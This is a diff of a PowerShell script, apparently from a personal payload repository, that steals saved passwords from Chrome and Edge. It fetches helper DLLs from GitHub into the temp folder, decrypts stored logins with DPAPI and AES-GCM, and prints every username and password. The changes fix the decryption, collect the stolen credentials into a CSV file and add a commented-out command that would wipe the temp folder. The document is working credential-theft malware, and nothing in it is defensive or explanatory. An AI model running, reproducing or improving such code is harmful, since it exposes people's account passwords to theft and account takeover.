@@ -6,7 +6,6 @@ $EdgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
 $SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
 $SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"
 $SystemSecurityDllPath = "$env:TEMP\System.Security.dll"
-$AlgorithmsDllPath = "$env:TEMP\System.Security.Cryptography.Algorithms.dll"
 $BouncyCastlePath = "$env:TEMP\BouncyCastle.Cryptography.dll"
 
 # Download SQLite DLLs if missing
@@ -19,9 +18,6 @@ if (-not (Test-Path $SQLiteInteropPath)) {
 if (-not (Test-Path $SystemSecurityDllPath)) {
     Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Security.dll" -outfile $SystemSecurityDllPath
 }
-if (-not (Test-Path $AlgorithmsDllPath)) {
-    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Security.Cryptography.Algorithms.dll" -outfile $AlgorithmsDllPath
-}
 if (-not (Test-Path $BouncyCastlePath)) {
     Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/main/assets/BouncyCastle.Cryptography.dll" -OutFile $BouncyCastlePath
 }
@@ -29,13 +25,12 @@ if (-not (Test-Path $BouncyCastlePath)) {
 # Load SQLite Assembly
 Add-Type -Path $SQLiteDllPath -ErrorAction Stop
 Add-Type -Path $SystemSecurityDllPath -ErrorAction Stop
-Add-Type -Path $AlgorithmsDllPath -ErrorAction Stop
 Add-Type -Path $BouncyCastlePath -ErrorAction Stop
 
 Add-Type -TypeDefinition @"
 using System;
 using System.Text;
-using System.Security.Cryptography; // FIXED: Added this to resolve ProtectedData and DataProtectionScope errors
+using System.Security.Cryptography;
 using Org.BouncyCastle.Crypto;
 using Org.BouncyCastle.Crypto.Parameters;
 using Org.BouncyCastle.Security;
@@ -55,7 +50,7 @@ public class CryptoHelper {
                 return DecryptAESGCM(encryptedData, aesKey);
             } else {
                 Console.WriteLine("Using DPAPI Decryption");
-                return ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser); // FIXED: Works now
+                return ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
             }
         }
         catch (Exception ex) {
@@ -65,27 +60,39 @@ public class CryptoHelper {
 
     private static byte[] DecryptAESGCM(byte[] encryptedData, byte[] aesKey) {
         try {
-            if (encryptedData.Length < 28)
+            // Validate minimal length: prefix (3) + IV (12) + tag (16) = 31 bytes minimum.
+            if (encryptedData.Length < 31)
                 throw new Exception("Invalid AES-GCM encrypted data");
 
-            byte[] iv = new byte[12]; // IV is 12 bytes
-            byte[] tag = new byte[16]; // Tag is 16 bytes
-            byte[] ciphertext = new byte[encryptedData.Length - 28];
+            byte[] iv = new byte[12]; // 12-byte IV
+            // The authentication tag is 16 bytes and is at the end.
+            byte[] tag = new byte[16];
+            // The ciphertext length = total - (prefix 3 + IV 12 + tag 16)
+            byte[] ciphertext = new byte[encryptedData.Length - 31];
 
+            // Extract the IV from bytes 3 to 14
             Array.Copy(encryptedData, 3, iv, 0, 12);
+            // Extract the tag from the end of the data
             Array.Copy(encryptedData, encryptedData.Length - 16, tag, 0, 16);
+            // Extract the ciphertext from byte 15 onward, until before the tag
             Array.Copy(encryptedData, 15, ciphertext, 0, ciphertext.Length);
 
             Console.WriteLine(string.Format("IV Length: {0}", iv.Length));
             Console.WriteLine(string.Format("Ciphertext Length: {0}", ciphertext.Length));
             Console.WriteLine(string.Format("Tag Length: {0}", tag.Length));
 
+            // Combine ciphertext and tag into one array
+            byte[] ctPlusTag = new byte[ciphertext.Length + tag.Length];
+            Array.Copy(ciphertext, 0, ctPlusTag, 0, ciphertext.Length);
+            Array.Copy(tag, 0, ctPlusTag, ciphertext.Length, tag.Length);
+
+            // Initialize GCM cipher
             GcmBlockCipher gcm = new GcmBlockCipher(new AesEngine());
             AeadParameters parameters = new AeadParameters(new KeyParameter(aesKey), 128, iv, null);
             gcm.Init(false, parameters);
 
-            byte[] decrypted = new byte[gcm.GetOutputSize(ciphertext.Length)];
-            int len = gcm.ProcessBytes(ciphertext, 0, ciphertext.Length, decrypted, 0);
+            byte[] decrypted = new byte[gcm.GetOutputSize(ctPlusTag.Length)];
+            int len = gcm.ProcessBytes(ctPlusTag, 0, ctPlusTag.Length, decrypted, 0);
             gcm.DoFinal(decrypted, len);
 
             return decrypted;
@@ -95,7 +102,7 @@ public class CryptoHelper {
         }
     }
 }
-"@ -Language CSharp -ReferencedAssemblies "$env:TEMP\BouncyCastle.Cryptography"
+"@ -Language CSharp -ReferencedAssemblies @($BouncyCastlePath, $SystemSecurityDllPath)
 
 
 function Get-AESKey {
@@ -179,6 +186,17 @@ function Extract-Passwords {
                 Write-Output "Username: $username"
                 Write-Output "Password: $decryptedPassword"
                 Write-Output "--------------------------------"
+
+                if ($decryptedPassword -and -not $decryptedPassword.StartsWith("[") -and $decryptedPassword -ne "[Invalid password format]") {
+                    $Results = $Results + [pscustomobject]@{
+                        Browser  = $BrowserName
+                        Profile  = $Profile.Name
+                        URL      = $url
+                        Username = $username
+                        Password = $decryptedPassword
+                    }
+                    Write-Output "Stored in results: $username"
+                }
             }
 
             $SQLiteReader.Close()
@@ -187,6 +205,15 @@ function Extract-Passwords {
     }
 }
 
-
+$Results = @()
 Extract-Passwords -BrowserPath $ChromePath -BrowserName "Chrome"
 Extract-Passwords -BrowserPath $EdgePath -BrowserName "Edge"
+
+if ($Results.Count -gt 0) {
+    $Results | Export-Csv -Path "$env:TEMP\DecryptedPasswords.csv" -NoTypeInformation
+} else {
+    Write-Output "No decrypted passwords found."
+}
+
+Start-Sleep -Milliseconds 500
+# Start-Process powershell -ArgumentList "-Command Remove-Item '$env:TEMP\*' -Force -Recurse -ErrorAction SilentlyContinue" -NoNewWindow
